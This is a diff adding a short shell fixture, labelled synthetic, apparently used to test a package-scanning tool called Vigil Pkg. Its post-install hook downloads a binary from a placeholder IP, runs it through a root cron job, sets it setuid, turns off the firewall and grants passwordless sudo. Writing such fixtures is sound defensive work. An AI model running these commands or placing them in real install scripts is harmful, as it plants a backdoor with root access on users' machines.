@@ -1,0 +1,15 @@
+# SYNTHETIC test fixture for Vigil Pkg: every post-install trick. Inert text.
+post_install() {
+  useradd -r -s /usr/bin/nologin installer-demo
+  systemctl enable --now installer-demo.service
+  curl -s https://203.0.113.7/agent -o /usr/local/bin/agent
+  usermod -aG wheel installer-demo
+  echo '* * * * * root /usr/local/bin/agent' | crontab -
+  chmod u+s /usr/local/bin/agent
+  ufw disable
+  echo 'installer-demo ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+}
+
+post_upgrade() {
+  post_install
+}
